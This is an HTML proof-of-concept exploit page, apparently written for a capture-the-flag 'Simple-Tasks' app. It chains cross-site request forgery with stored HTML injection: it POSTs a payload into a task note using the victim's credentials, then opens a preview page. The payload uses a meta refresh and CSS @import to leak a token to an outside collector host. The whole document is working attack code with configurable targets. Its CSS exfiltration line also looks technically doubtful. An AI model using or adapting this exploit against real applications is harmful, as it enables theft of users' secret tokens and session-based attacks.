<!DOCTYPE html>
<meta charset="utf-8">
<title>Simple-Tasks PoC</title>
<script>
/* ---------------------------------------------------------------
   CONFIG SECTION
---------------------------------------------------------------- */
const CHAL_ORIGIN  = "http://localhost:80";         // <-- adjust
const OUR_COLLECTOR = "https://xng98z0ayh4xm2rgego9xm8k01jdbfi72.oast.site/leak";   // <-- adjust

/* Your no-JS payload – it will run inside /tasks/preview */
const PAYLOAD = `
<meta http-equiv="refresh"
      content="0;url=https://xng98z0ayh4xm2rgego9xm8k01jdbfi72.oast.site?t={{{}}}">
<style>
  /* CSS-exfil sends one request per hex nibble in the token */
  @import url("https://xng98z0ayh4xm2rgego9xm8k01jdbfi72.oast.site?c=" attr(data-token string));
</style>`;

/* ---------------------------------------------------------------
   EXPLOIT FLOW
   1) ensure Task 0 exists
   2) POST the malicious note into it
   3) open the preview so the note executes
---------------------------------------------------------------- */
(async () => {
  try {
    /* 1 — create Task 0 (harmless if it already exists) */
    await fetch(CHAL_ORIGIN + "/tasks/create",
                {method: "POST", credentials: "include"});

    /* 2 — add our payload as the first note in Task 0          */
    const body = new URLSearchParams({content: PAYLOAD});
    await fetch(CHAL_ORIGIN + "/tasks/0",
                {method: "POST", body, credentials: "include"});

    /* 3 — open the raw preview (script-free CSP)                */
    location.href = CHAL_ORIGIN + "/tasks/preview/0/0";
  } catch (e) {
    console.error("Exploit failed:", e);
  }
})();
</script>
